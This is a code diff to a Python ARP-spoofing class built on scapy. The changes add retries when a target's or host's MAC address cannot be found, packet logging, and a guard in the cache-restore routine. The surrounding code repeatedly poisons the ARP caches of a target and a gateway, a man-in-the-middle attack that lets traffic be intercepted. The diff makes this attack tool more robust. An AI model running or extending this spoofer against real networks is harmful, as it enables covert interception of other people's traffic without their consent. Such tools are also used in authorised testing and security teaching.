@@ -24,11 +24,19 @@ class ArpSpoofer:
         if not self.running:
             return
 
-        # Tell target we are host
-        self.spoof(self.target_ip, self.target_mac, self.host_ip)
-
-        # Tell host we are target
-        self.spoof(self.host_ip, self.host_mac, self.target_ip)
+        # Tell the target we are host
+        if self.target_mac is None:
+            self.buffer.put("arp", f"Could not find MAC address for target IP {self.target_ip}. Searching again...")
+            self.target_mac = self.get_mac(self.target_ip)
+        else:
+            self.spoof(self.target_ip, self.target_mac, self.host_ip)
+        
+        # Tell the host we are target
+        if self.host_mac is None:
+            self.buffer.put("arp", f"Could not find MAC address for host IP {self.host_ip}. Searching again...")
+            self.host_mac = self.get_mac(self.host_ip)
+        else:
+            self.spoof(self.host_ip, self.host_mac, self.target_ip)
 
         self.timer = threading.Timer(self.interval, self.tick)
         self.timer.start()
@@ -79,10 +87,12 @@ class ArpSpoofer:
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = broadcast / arp_request
+        self.buffer.put("arp", "MAC address request", packet)
 
         answered, _ = scapy.srp(packet, timeout=2, verbose=False)
 
         if answered:
+            self.buffer.put("arp", "MAC address response", answered[0][1])
             return answered[0][1].hwsrc
 
 
@@ -101,6 +111,10 @@ class ArpSpoofer:
     def restore(self, destination_ip, source_ip):
         destination_mac = self.get_mac(destination_ip)
         source_mac = self.get_mac(source_ip)
+
+        if destination_mac is None or source_mac is None:
+            self.buffer.put("arp", f"Could not find MAC address for {destination_ip} or {source_ip}. Cannot send restore packet.")
+            return
 
         packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
             op=2,
